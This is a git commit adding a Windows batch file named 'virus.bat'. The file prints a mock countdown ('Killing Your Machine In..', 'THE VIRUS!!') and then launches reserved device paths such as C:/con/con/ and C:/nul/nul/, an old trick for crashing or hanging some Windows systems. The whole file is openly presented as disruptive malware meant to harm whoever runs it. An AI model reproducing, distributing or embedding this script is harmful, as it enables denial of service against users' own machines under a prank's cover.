7c6b9e70eda764ecf28c93836855cd72a9a63014
slug <134125999+Asuflex-On-Github@users.noreply.github.com>
2023-09-24 17:06:18 +0500

    Created new virus.bat
    created by @Asuflex-On-Github

---
+++ new virus.bat
@@ -0,0 +1,38 @@
+@echo off
+
+echo Killing Your Machine In..
+
+timeout 1
+
+echo 3
+
+timeout 1
+
+echo 2
+
+timeout 1
+
+echo 1
+
+timeout 1
+
+echo Be Prepared For
+
+timeout 3
+
+echo THE VIRUS!!
+
+goto start
+
+:start
+
+start C:/con/con/
+
+start C:/nul/nul/
+
+start C:/prn/prn
+
+start C:/aux/aux
+
+
+
